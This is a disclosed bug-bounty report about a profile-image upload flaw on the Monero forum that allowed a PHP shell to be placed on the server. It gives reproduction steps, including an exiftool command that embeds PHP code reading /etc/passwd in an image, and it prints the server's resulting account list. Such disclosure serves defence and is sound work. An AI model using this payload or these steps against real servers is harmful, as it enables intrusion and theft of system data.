# forum.getmonero.org Shell upload

## Report Details
- **Report ID**: 357858
- **URL**: https://hackerone.com/reports/357858
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-05-26T13:26:09.625Z
- **Disclosed**: 2018-07-27T11:54:11.453Z

## Reporter
- **Username**: kaulse
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: monero

## Vulnerability Information
**Summary:** 
The method uploadProfile in the UsersController allows an attacker to upload a shell to the target server due to lack of image validation.

**Description:**

## Steps To Reproduce:
  1. Open POC https://forum.getmonero.org/uploads/profile/lNobodyl1527340454.php or https://forum.getmonero.org/uploads/profile/lNobodyl1527341021.php
Or just follow these steps:
1. Find a nice picture and embed the shell into the image like this `exiftool -documentname='<?php echo file_get_contents("/etc/passwd"); ?>' picture.png`
2. Rename the jpg/png picture to the `.php` extension.
3. Upload the picture.
4. You will get an 500 error page. Ignore it. Grep the time from the response and convert it to a timestamp.
5. Use the timestamp to find your shell: `https://forum.getmonero.org/uploads/profile/[USERNAMAE][timestamp].php`


## Gathered infos:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
bind:x:103:109::/var/cache/bind:/bin/false
ntpd:x:104:110::/var/run/openntpd:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
fluffypony:x:1000:1000:Fluffypony,,,:/home/fluffypony:/bin/bash
postfix:x:106:114::/var/spool/postfix:/bin/false
ossec:x:1001:1001::/var/lib/dome9/ossec:/bin/false
mysql:x:107:116:MySQL Server,,,:/var/lib/mysql:/bin/false
redis:x:108:118:redis server,,,:/var/lib/redis:/bin/false
pollinate:x:109:1::/var/cache/pollinate:/bin/false
gearman:x:110:119:Gearman Job Server,,,:/var/lib/gearman:/bin/false
memcache:x:111:120:Memcached,,,:/nonexistent:/bin/false
debian-tor:x:112:121::/var/lib/tor:/bin/false
systemd-timesync:x:113:123:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:114:124:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:115:125:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:116:126:systemd Bus Proxy,,,:/run/systemd:/bin/false
uuidd:x:100:101::/run/uuidd:/bin/false
_apt:x:117:65534::/nonexistent:/bin/false
blackfire:x:999:999::/dev/null:
colord:x:118:129:colord colour management daemon,,,:/var/lib/colord:/bin/false
oident:x:119:130::/:/bin/false
```

## Impact

A hacker can hack the server ^^.

## Attachments
No attachments
